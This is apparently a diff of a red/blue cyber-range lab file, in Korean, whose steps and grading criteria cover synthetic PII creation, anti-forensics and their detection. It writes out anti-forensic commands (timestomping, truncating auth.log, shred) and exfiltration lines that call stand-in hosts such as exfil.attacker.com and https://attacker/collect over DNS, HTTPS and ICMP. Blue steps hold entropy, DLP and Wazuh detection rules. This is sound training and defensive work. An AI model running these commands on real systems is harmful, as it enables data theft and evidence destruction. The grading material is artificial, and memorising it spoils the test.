@@ -37,20 +37,21 @@ steps:
     type: output_contains
     expect: 100 fake records
     semantic:
-      intent: '[RED] 안티포렌식과 데이터 유출 공격 단계 실습 — 실제 공격 명령/스크립트 실행 및 결과 확인'
+      intent: '[RED] 가짜 민감 데이터 100건 생성 — python3 로 faker 라이브러리 또는 직접 random 으로 이름(Kim Min-jun·Lee Ji-hoon)·이메일(user@example.com)·카드번호(4XXX-XXXX-XXXX-XXXX
+        Luhn 형식) 100 rows CSV /tmp/sensitive_data.csv 저장. 유출 실습 대상 데이터 준비. 실제 PII 아닌 합성'
       success_criteria:
-      - 공격 명령/스크립트 실제 실행 또는 유효 페이로드 생성
-      - 목표 기법이 작동함을 출력·로그로 확인
-      - MITRE ATT&CK 기법 ID 또는 명칭 1개 이상 언급
+      - python + faker 또는 random 로 100건 생성
+      - 이름·이메일·카드번호 필드 포함
+      - /tmp/sensitive_data.csv 파일 저장
       acceptable_methods:
-      - 실제 도구(nmap/msfvenom/sqlmap/hydra/curl/ssh) 실행
-      - 방어 규칙 파일(.rules/XML) 작성 또는 편집
-      - Python 스크립트로 자동화 구현
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - python + faker.Faker() + 100 rows
+      - python + random 로 직접 생성
+      - mockaroo.com 스키마 기반
+      - 합성 PII generator
       negative_signs:
-      - 실행 없이 개념만 서술
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 일반 응답
+      - 실제 PII 사용
+      - 데이터 포맷 없이 단순 문자열
+      - 100건 미만
   target_vm: attacker
   script: "python3 -c \"\nimport random\nwith open('/tmp/sensitive_data.csv', 'w') as f:\n    f.write('name,email,card_number,ssn\\\
     n')\n    for i in range(100):\n        name = f'User_{i:03d}'\n        email = f'user{i}@example.com'\n\
@@ -77,20 +78,24 @@ steps:
     type: output_contains
     expect: anti-forensic
     semantic:
-      intent: '[RED] 안티포렌식과 데이터 유출 공격 단계 실습 — 실제 공격 명령/스크립트 실행 및 결과 확인'
+      intent: '[RED] 안티포렌식 기법 시뮬레이션 — touch -t 202001010000 /tmp/fake_file (타임스탬프 조작, 최근 접근을 과거로 위장) +
+        cat /dev/null > /var/log/auth.log (로그 삭제 흔적) + shred -u /tmp/sensitive_data.csv (시큐어 삭제, 덮어쓰기
+        후 unlink). MITRE T1070.006 Timestomp + T1070.002 Clear Linux/Mac System Logs + T1070.004 File
+        Deletion'
       success_criteria:
-      - 공격 명령/스크립트 실제 실행 또는 유효 페이로드 생성
-      - 목표 기법이 작동함을 출력·로그로 확인
-      - MITRE ATT&CK 기법 ID 또는 명칭 1개 이상 언급
+      - touch -t 타임스탬프 조작
+      - 로그 삭제 또는 덮어쓰기
+      - shred 시큐어 삭제
+      - T1070 서브기법 매핑
       acceptable_methods:
-      - 실제 도구(nmap/msfvenom/sqlmap/hydra/curl/ssh) 실행
-      - 방어 규칙 파일(.rules/XML) 작성 또는 편집
-      - Python 스크립트로 자동화 구현
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - touch -t + shred + truncate log
+      - stat 로 이전/이후 비교
+      - wipe 대체 도구
+      - bleachbit 로 자동화
       negative_signs:
-      - 실행 없이 개념만 서술
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 일반 응답
+      - 단일 기법만
+      - T1070 매핑 없음
+      - 실제 로그 삭제 (테스트 환경이라도 위험)
   target_vm: attacker
   script: 'echo "anti-forensic test" > /tmp/af_test.txt && touch -t 202301010000 /tmp/af_test.txt && stat
     /tmp/af_test.txt | grep Modify && echo "--- Timestamp manipulated to 2023-01-01 ---" && echo "Log
@@ -115,20 +120,22 @@ steps:
     type: output_contains
     expect: DNS Exfiltration
     semantic:
-      intent: '[RED] 안티포렌식과 데이터 유출 공격 단계 실습 — 실제 공격 명령/스크립트 실행 및 결과 확인'
+      intent: '[RED] DNS 터널링 데이터 유출 — python3 로 /tmp/sensitive_data.csv 읽기 + base64 인코딩 + 63바이트 분할 + dig
+        TXT <chunk>.<counter>.exfil.attacker.com 으로 DNS 쿼리 embedding 반복. 민감 데이터를 DNS 응답으로 외부 전송. w3 s2
+        의 C2 DNS 와 유사하지만 exfiltration 목적. MITRE T1048.003 DNS'
       success_criteria:
-      - 공격 명령/스크립트 실제 실행 또는 유효 페이로드 생성
-      - 목표 기법이 작동함을 출력·로그로 확인
-      - MITRE ATT&CK 기법 ID 또는 명칭 1개 이상 언급
+      - 민감 데이터 파일 읽기 + base64
+      - 63바이트 분할 + DNS 쿼리 반복
+      - T1048.003 Exfiltration DNS 매핑
       acceptable_methods:
-      - 실제 도구(nmap/msfvenom/sqlmap/hydra/curl/ssh) 실행
-      - 방어 규칙 파일(.rules/XML) 작성 또는 편집
-      - Python 스크립트로 자동화 구현
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - python base64 + socket 또는 dnspython
+      - iodine/dnscat2 실제 도구
+      - xxd + dig 수동
+      - scapy DNS 레이어
       negative_signs:
-      - 실행 없이 개념만 서술
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 일반 응답
+      - HTTP 사용 (DNS 아님)
+      - 평문 전송 (base64 없음)
+      - Exfiltration 맥락 없음
   target_vm: attacker
   script: "cat > /tmp/dns_exfil.sh << 'SCRIPT'\n#!/bin/bash\nDATA=$(head -5 /tmp/sensitive_data.csv |\
     \ base64 | tr -d '\\n')\nCHUNK_SIZE=50\nSEQ=0\necho \"=== DNS Exfiltration Simulation ===\"\necho\
@@ -157,20 +164,23 @@ steps:
     type: output_contains
     expect: Multi-Channel
     semantic:
-      intent: '[RED] 안티포렌식과 데이터 유출 공격 단계 실습 — 실제 공격 명령/스크립트 실행 및 결과 확인'
+      intent: '[RED] 멀티채널 유출 — HTTPS POST (curl -X POST -d @encrypted_data https://attacker/collect, openssl
+        로 사전 암호화) + ICMP payload (ping -p <hex> <attacker>, packet data 필드에 숨김). 두 채널 병행으로 탐지 어려움 증가:
+        HTTPS 는 TLS 로 내용 감추고 ICMP 는 예상 밖 채널. MITRE T1048.002 HTTPS + T1095 Non-Application Layer Protocol'
       success_criteria:
-      - 공격 명령/스크립트 실제 실행 또는 유효 페이로드 생성
-      - 목표 기법이 작동함을 출력·로그로 확인
-      - MITRE ATT&CK 기법 ID 또는 명칭 1개 이상 언급
+      - HTTPS POST + ICMP 두 채널 동시
+      - HTTPS 는 openssl 암호화 포함
+      - ICMP payload embedding
+      - T1048.002 + T1095 매핑
       acceptable_methods:
-      - 실제 도구(nmap/msfvenom/sqlmap/hydra/curl/ssh) 실행
-      - 방어 규칙 파일(.rules/XML) 작성 또는 편집
-      - Python 스크립트로 자동화 구현
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - curl -X POST + openssl enc + ping -p
+      - python requests + scapy ICMP
+      - ngrep 로 ICMP 데이터 확인
+      - hping3 -d <size> -E <file>
       negative_signs:
-      - 실행 없이 개념만 서술
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 일반 응답
+      - 한 채널만
+      - 암호화 없는 HTTPS
+      - ICMP 활용 없음
   target_vm: attacker
   script: 'gzip -c /tmp/sensitive_data.csv > /tmp/exfil_payload.gz && openssl enc -aes-256-cbc -salt -in
     /tmp/exfil_payload.gz -out /tmp/exfil_encrypted.bin -pass pass:ExfilKey2026 -pbkdf2 2>/dev/null &&
@@ -201,20 +211,22 @@ steps:
     type: output_contains
     expect: DNS Exfiltration Detection
     semantic:
-      intent: '[BLUE] 안티포렌식과 데이터 유출 방어·탐지 단계 — 탐지 규칙·모니터링·대응 체계 구현'
+      intent: '[BLUE] Shannon 엔트로피 DNS 유출 탐지 — python3 로 DNS 쿼리 서브도메인 추출 + Shannon entropy 계산 H(X) = -Σ
+        p(x) log2(p(x)). 엔트로피 > 3.5 (정상 도메인은 2-3 수준) + 쿼리 길이 > 50 (정상 30 미만) 임계치 조합. base64/랜덤 embedding
+        DNS 유출 탐지. pcap 또는 eve.json 실시간 분석'
       success_criteria:
-      - Suricata/Wazuh/auditd/nftables 등 방어 도구 룰·설정 제시
-      - 탐지 시나리오 테스트 및 결과 로그
-      - false positive 또는 tuning 고려 언급
+      - python Shannon entropy 계산 함수
+      - 엔트로피 > 3.5 + 길이 > 50 임계치
+      - DNS 유출 통계 탐지 개념
       acceptable_methods:
-      - 실제 도구(nmap/msfvenom/sqlmap/hydra/curl/ssh) 실행
-      - 방어 규칙 파일(.rules/XML) 작성 또는 편집
-      - Python 스크립트로 자동화 구현
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - python math.log2 + Counter
+      - scipy.stats.entropy
+      - Zeek dns.log + 외부 스크립트
+      - splunk stats avg/stdev
       negative_signs:
-      - 실행 없이 개념만 서술
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 일반 응답
+      - 엔트로피 개념 없음
+      - 단순 키워드 매칭
+      - 임계치 없음
   target_vm: secu
   script: "python3 -c \"\nimport math\nfrom collections import Counter\ndef shannon_entropy(s):\n    freq\
     \ = Counter(s)\n    length = len(s)\n    return -sum((count/length) * math.log2(count/length) for\
@@ -248,20 +260,22 @@ steps:
     - DLP Rule Analysis
     - Regex
     semantic:
-      intent: '[BLUE] 안티포렌식과 데이터 유출 방어·탐지 단계 — 탐지 규칙·모니터링·대응 체계 구현'
+      intent: '[BLUE] DLP 정규식 룰 — 신용카드(^\d{4}[- ]?\d{4}[- ]?\d{4}[- ]?\d{4}$ + Luhn 검증)·SSN(한국 주민번호 \d{6}-[1-4]\d{6})·대량
+        이메일(10+ 이메일 1회 요청) 패턴 탐지. /etc/dlp/patterns.conf 또는 Suricata 룰로 아웃바운드 검사. MITRE T1041 Exfiltration'
       success_criteria:
-      - Suricata/Wazuh/auditd/nftables 등 방어 도구 룰·설정 제시
-      - 탐지 시나리오 테스트 및 결과 로그
-      - false positive 또는 tuning 고려 언급
+      - 신용카드·SSN 정규식 + Luhn 검증 언급
+      - 대량 이메일 임계치 (10+)
+      - DLP(Data Loss Prevention) 개념
+      - T1041 매핑
       acceptable_methods:
-      - 실제 도구(nmap/msfvenom/sqlmap/hydra/curl/ssh) 실행
-      - 방어 규칙 파일(.rules/XML) 작성 또는 편집
-      - Python 스크립트로 자동화 구현
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - python regex + Luhn 함수
+      - OpenDLP / MyDLP 오픈소스
+      - Suricata pcre 룰
+      - Zeek signature framework
       negative_signs:
-      - 실행 없이 개념만 서술
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 일반 응답
+      - 단순 grep (정규식 없음)
+      - Luhn 검증 누락 (false positive 많음)
+      - DLP 개념 없음
   target_vm: secu
   script: "python3 -c \"\nimport re\nrules = {\n    'credit_card': r'\\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14})\\\
     b',\n    'ssn': r'\\b\\d{3}-\\d{2}-\\d{4}\\b',\n    'email_bulk': r'[\\w.+-]+@[\\w-]+\\.[\\w.-]+',\n\
@@ -293,20 +307,21 @@ steps:
     type: output_contains
     expect: data_exfiltration
     semantic:
-      intent: '[BLUE] 안티포렌식과 데이터 유출 방어·탐지 단계 — 탐지 규칙·모니터링·대응 체계 구현'
+      intent: '[BLUE] Wazuh 데이터 유출 탐지 룰 — 대량 파일 접근(auditd 로 /home 이하 50+ 파일 5분 내 읽기) + DNS 터널링(jq Suricata
+        dns.log 엔트로피) + USB 장치 연결(journalctl -k | grep usb). 3종 유출 벡터 모두 커버. local_rules.xml 에 정의'
       success_criteria:
-      - Suricata/Wazuh/auditd/nftables 등 방어 도구 룰·설정 제시
-      - 탐지 시나리오 테스트 및 결과 로그
-      - false positive 또는 tuning 고려 언급
+      - 3종 유출 벡터 룰 (대량 파일·DNS·USB)
+      - Wazuh ruleset 추가
+      - T1041/T1052 Exfiltration 맥락
       acceptable_methods:
-      - 실제 도구(nmap/msfvenom/sqlmap/hydra/curl/ssh) 실행
-      - 방어 규칙 파일(.rules/XML) 작성 또는 편집
-      - Python 스크립트로 자동화 구현
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - Wazuh local_rules.xml + auditd 통합
+      - Wazuh USB detection via kernel events
+      - Elastic SIEM 대체
+      - osquery + file integrity
       negative_signs:
-      - 실행 없이 개념만 서술
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 일반 응답
+      - 1종 벡터만
+      - USB 탐지 생략
+      - Exfiltration 개념 없음
   target_vm: siem
   script: "cat > /tmp/wazuh_dlp_rules.xml << 'EOF'\n<group name=\"data_exfiltration\">\n  <rule id=\"\
     100300\" level=\"12\" frequency=\"50\" timeframe=\"300\">\n    <if_sid>554</if_sid>\n    <match>open|read</match>\n\
@@ -341,20 +356,21 @@ steps:
     type: output_contains
     expect: Exfiltration & Anti-Forensics
     semantic:
-      intent: '[RED/BLUE] 안티포렌식과 데이터 유출 통합 — Phase 전환 또는 종합 보고서·환경 정리'
+      intent: '[RED/BLUE] 데이터 유출 평가 보고서 /tmp/exfil_report.txt — 채널별 비교표: DNS 터널(대역폭 ~100KB/s, 탐지 난이도 중,
+        엔트로피 분석 방어) / HTTPS POST (대역폭 ~10MB/s, 탐지 어려움 TLS 암호화, DLP/TLS inspect 방어) / ICMP payload (대역폭
+        ~1KB/s, 탐지 쉬움 비정상 트래픽, firewall drop 방어). 3채널 trade-off 분석. 환경 정리 (rm sensitive_data.csv)'
       success_criteria:
-      - RED/BLUE 양쪽 산출물 모두 포함 또는 정리
-      - 보고서 파일 저장 또는 markdown 출력
-      - MITRE ATT&CK 매핑 + 개선 권고
+      - /tmp/exfil_report.txt 보고서
+      - 채널별 대역폭 + 탐지 난이도 + 방어 3요소 비교
+      - 정리 (rm) 포함
       acceptable_methods:
-      - 실제 도구(nmap/msfvenom/sqlmap/hydra/curl/ssh) 실행
-      - 방어 규칙 파일(.rules/XML) 작성 또는 편집
-      - Python 스크립트로 자동화 구현
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - cat > file + 비교표
+      - markdown 표
+      - MITRE ATT&CK T1048 계열 매핑
       negative_signs:
-      - 실행 없이 개념만 서술
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 일반 응답
+      - 1채널만 분석
+      - 정량 지표 없음
+      - 방어 권장 누락
   target_vm: attacker
   script: "rm -f /tmp/sensitive_data.csv /tmp/dns_exfil.sh /tmp/exfil_*.gz /tmp/exfil_*.bin /tmp/icmp_*.txt\
     \ /tmp/af_test.txt 2>/dev/null && cat > /tmp/exfil_report.txt << 'EOF'\n=== Data Exfiltration & Anti-Forensics\
